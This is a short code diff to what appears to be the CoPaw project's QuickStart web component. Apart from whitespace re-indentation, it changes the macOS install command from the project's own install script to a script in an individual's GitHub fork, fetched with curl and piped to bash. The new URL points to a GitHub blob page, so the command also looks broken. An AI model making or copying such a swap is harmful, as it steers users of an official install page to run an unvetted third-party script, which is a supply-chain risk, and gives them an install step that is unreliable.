@@ -27,7 +27,7 @@ const DESKTOP_RELEASES_URL = "https://github.com/agentscope-ai/CoPaw/releases";
 const COMMANDS = {
   pip: ["pip install copaw", "copaw init --defaults", "copaw app"],
   scriptMac: [
-    "curl -fsSL https://copaw.agentscope.io/install.sh | bash",
+    "curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash",
     "copaw init --defaults",
     "copaw app",
   ],
@@ -422,8 +422,8 @@ export function QuickStart({ config, lang }: QuickStartProps) {
                   scriptPlatform === "mac"
                     ? COMMANDS.scriptMac
                     : scriptWinVariant === "cmd"
-                    ? COMMANDS.scriptWinCmd
-                    : COMMANDS.scriptWinPs
+                      ? COMMANDS.scriptWinCmd
+                      : COMMANDS.scriptWinPs
                 }
                 copied={
                   copiedId === `script-${scriptPlatform}-${scriptWinVariant}`
@@ -433,8 +433,8 @@ export function QuickStart({ config, lang }: QuickStartProps) {
                     (scriptPlatform === "mac"
                       ? COMMANDS.scriptMac
                       : scriptWinVariant === "cmd"
-                      ? COMMANDS.scriptWinCmd
-                      : COMMANDS.scriptWinPs
+                        ? COMMANDS.scriptWinCmd
+                        : COMMANDS.scriptWinPs
                     ).join("\n"),
                     `script-${scriptPlatform}-${scriptWinVariant}`,
                   )
